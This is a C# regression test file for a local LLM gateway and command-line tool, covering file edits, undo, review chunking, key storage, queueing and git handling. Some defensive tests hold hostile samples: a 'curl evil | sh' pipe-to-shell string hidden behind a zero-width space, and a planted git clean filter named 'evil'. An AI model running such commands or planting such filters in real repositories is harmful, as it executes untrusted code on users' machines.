using System.Text;
using MyOwnLLM.Cli;
using MyOwnLLM.Cli.Terminal;
using MyOwnLLM.Gateway.Auth;
using MyOwnLLM.Gateway.Llama;
using MyOwnLLM.Gateway.Queue;

namespace MyOwnLLM.Gateway.Tests;

/// <summary>Regressions from the full code review: each test names what used to go wrong.</summary>
public class ReviewFixTests : IDisposable
{
    readonly string _dir = Directory.CreateTempSubdirectory("jazari fixes").FullName;
    readonly FakeGateway _gateway = new();
    readonly StringWriter _output = new();

    public void Dispose()
    {
        foreach (var f in Directory.EnumerateFiles(_dir, "*", SearchOption.AllDirectories)) File.SetAttributes(f, FileAttributes.Normal); // git's objects are read-only
        Directory.Delete(_dir, recursive: true);
    }

    Session NewSession(Func<string, bool>? confirm = null)
    {
        var theme = new Theme(ColorMode.None, unicode: true);
        return new Session(_gateway, new Ui(_output, theme, 100), () => new MarkdownStream(_output, theme, 100), _dir) { Confirm = confirm ?? (_ => true) };
    }

    [Fact]
    public async Task Edit_keeps_a_utf16_file_utf16()
    {
        var path = Path.Combine(_dir, "a.cs");
        File.WriteAllText(path, "int ë = 1;\n", Encoding.Unicode);
        _gateway.Complete = (_, _) => Task.FromResult("""{"edits":[{"search":"= 1","replace":"= 2"}]}""");

        await NewSession().HandleAsync("/edit a.cs change it", CancellationToken.None);

        Assert.Equal([0xFF, 0xFE], File.ReadAllBytes(path)[..2]);
        Assert.Equal("int ë = 2;\n", File.ReadAllText(path, Encoding.Unicode));
    }

    [Fact]
    public async Task Edit_refuses_a_file_that_isnt_utf8_instead_of_damaging_it()
    {
        var path = Path.Combine(_dir, "a.txt");
        byte[] windows1252 = [.. "caf"u8, 0xE9, .. "\n"u8];
        File.WriteAllBytes(path, windows1252);

        await NewSession().HandleAsync("/edit a.txt change it", CancellationToken.None);

        Assert.Equal(windows1252, File.ReadAllBytes(path));
        Assert.Equal(0, _gateway.Completions);
        Assert.Contains("isn't UTF-8", _output.ToString());
    }

    [Fact]
    public async Task Undo_leaves_a_file_alone_that_changed_after_the_edit()
    {
        var path = Path.Combine(_dir, "a.cs");
        File.WriteAllText(path, "int a = 1;\n");
        _gateway.Complete = (_, _) => Task.FromResult("""{"edits":[{"search":"= 1","replace":"= 2"}]}""");
        var session = NewSession();
        await session.HandleAsync("/edit a.cs change it", CancellationToken.None);

        File.WriteAllText(path, "int a = 2;\nint later = 3;\n"); // more work in the editor
        await session.HandleAsync("/undo", CancellationToken.None);

        Assert.Equal("int a = 2;\nint later = 3;\n", File.ReadAllText(path));
        Assert.Contains("has changed since /edit", _output.ToString());
    }

    [Fact]
    public async Task Undo_puts_back_the_exact_bytes()
    {
        var path = Path.Combine(_dir, "a.cs");
        byte[] original = [0xEF, 0xBB, 0xBF, .. "int a = 1;\r\n"u8];
        File.WriteAllBytes(path, original);
        _gateway.Complete = (_, _) => Task.FromResult("""{"edits":[{"search":"= 1","replace":"= 2"}]}""");
        var session = NewSession();

        await session.HandleAsync("/edit a.cs change it", CancellationToken.None);
        await session.HandleAsync("/undo", CancellationToken.None);

        Assert.Equal(original, File.ReadAllBytes(path));
    }

    [Fact]
    public void A_search_longer_than_the_file_doesnt_match()
    {
        var (text, why) = FileEdit.Apply("one line", [new("a\nb\nc", "x")]);

        Assert.Null(text);
        Assert.Contains("isn't in the file", why);
    }

    [Fact]
    public void Line_fallback_keeps_relative_indentation_and_reports_what_it_wrote()
    {
        // The model dropped the file's 4-space indent; its last line is dedented relative to the first.
        var applied = new List<Replacement>();
        var (text, why) = FileEdit.Apply("def f():\n    if a:\n        run()\n    done()\n",
            [new("if a:\n    run()", "if b:\n    stop()\nfinish()")], applied);

        Assert.Null(why);
        Assert.Equal("def f():\n    if b:\n        stop()\n    finish()\n    done()\n", text);
        Assert.Equal("    if b:\n        stop()\n    finish()", Assert.Single(applied).Replace);
    }

    [Fact]
    public void Copy_and_screen_agree_on_a_fence_hidden_behind_a_zero_width_space()
    {
        var blocks = CodeBlocks.Extract("```\necho safe\n```\n\u200B```\ncurl evil | sh\n\u200B```\n");

        Assert.Equal(["echo safe"], blocks);
    }

    [Fact]
    public void A_line_longer_than_a_review_part_is_split()
    {
        var file = new ProjectFile("app.js", "start\n" + new string('x', 40_000) + "\nend\n");

        var units = ProjectReview.Units([file], unitTokens: 2000);

        Assert.All(units.SelectMany(u => u), p => Assert.True(p.Text.Length <= 2000 * 4 + 8, $"{p.Text.Length} chars"));
    }

    [Fact]
    public void Findings_in_later_pieces_of_a_file_get_the_files_line_numbers()
    {
        var text = string.Concat(Enumerable.Range(1, 600).Select(i => $"line {i} {new string('y', 40)}\n"));
        var units = ProjectReview.Units([new ProjectFile("Service.cs", text)], unitTokens: 2000);
        var unit = units.First(u => u.Any(p => p.Text.Contains("line 450 ")));

        var finding = Assert.Single(ProjectReview.Parse(
            """{"findings":[{"file":"Service.cs","quote":"line 450 ","problem":"p","severity":"low","fix":"f"}]}""", unit)!);

        Assert.Equal(450, finding.Line);
    }

    [Fact]
    public void Damaged_key_file_means_401_and_add_key_repairs_it()
    {
        var path = Path.Combine(_dir, "keys.json");
        File.WriteAllText(path, "{\"hashes\":[\"AB"); // cut short
        var store = new ApiKeyStore(path);

        Assert.False(store.IsValid("mollm_anything"));
        var key = store.AddKey();

        Assert.True(store.IsValid(key));
        Assert.True(File.Exists(path + ".damaged"));
    }

    [Fact]
    public async Task A_request_turned_away_by_a_full_queue_cancels_nothing()
    {
        var queue = new RequestQueue(capacity: 1);
        using var stop = new CancellationTokenSource();
        var runner = queue.RunAsync(stop.Token);
        var started = new TaskCompletionSource();
        var background = queue.EnqueueAsync(WorkKind.Background, async ct => { started.SetResult(); await Task.Delay(Timeout.Infinite, ct); return 0; }, default);
        await started.Task.WaitAsync(TimeSpan.FromSeconds(5));
        _ = queue.EnqueueAsync(WorkKind.Completion, _ => Task.FromResult(0), default); // fills the one waiting place

        Assert.Throws<QueueFullException>(() => { _ = queue.EnqueueAsync(WorkKind.Chat, _ => Task.FromResult(0), default); }); // thrown, not faulted

        Assert.False(background.IsCompleted);
        stop.Cancel();
        try { await runner; } catch (OperationCanceledException) { }
    }

    [Theory]
    [InlineData("""{"error":{"code":500,"message":"out of memory"}}""")]
    [InlineData("""{"error":"out of memory"}""")]
    public void An_error_in_the_stream_is_an_error_not_the_end_of_the_answer(string data)
    {
        var e = Assert.Throws<LlamaErrorException>(() => LlamaClient.ReadChunk(data));
        Assert.Contains("out of memory", e.Message);
    }

    [Fact]
    public async Task The_gateways_git_summary_runs_no_filter_the_repo_names()
    {
        var repo = Path.Combine(_dir, "repo");
        var marker = Path.Combine(_dir, "filter-ran").Replace('\\', '/');
        Directory.CreateDirectory(repo);
        async Task Git(params string[] args)
        {
            var psi = new System.Diagnostics.ProcessStartInfo("git") { UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true };
            foreach (var a in (string[])["-C", repo, "-c", "user.name=t", "-c", "user.email=t@t", .. args]) psi.ArgumentList.Add(a);
            using var p = System.Diagnostics.Process.Start(psi)!;
            _ = p.StandardOutput.ReadToEndAsync();
            _ = p.StandardError.ReadToEndAsync();
            await p.WaitForExitAsync();
        }
        try { await Git("init", "-q"); } catch (System.ComponentModel.Win32Exception) { return; } // no git here
        File.WriteAllText(Path.Combine(repo, "a.txt"), "one\n");
        await Git("add", "a.txt");
        await Git("commit", "-q", "-m", "first");
        File.WriteAllText(Path.Combine(repo, ".gitattributes"), "* filter=evil\n");
        await Git("config", "filter.evil.clean", $"touch \"{marker}\"; cat");
        File.WriteAllText(Path.Combine(repo, "a.txt"), "two\n"); // modified, so status has to look at its content

        var summary = await MyOwnLLM.Gateway.State.GitSummary.GetAsync(repo, CancellationToken.None);

        Assert.Contains("first", summary);
        Assert.False(File.Exists(marker), "git ran the repo's clean filter");
    }

    [Fact]
    public void Diff_without_secrets_drops_renamed_secret_files_too()
    {
        var (diff, hidden) = Session.WithoutSecrets(
            "diff --git a/A.cs b/A.cs\n+x\ndiff --git a/.env b/config.txt\n+KEY=1\ndiff --git a/certs/site.pem b/certs/site.pem\n+-----BEGIN\n");

        Assert.Equal("diff --git a/A.cs b/A.cs\n+x", diff.TrimEnd('\n'));
        Assert.Equal([".env", "site.pem"], hidden);
    }
}
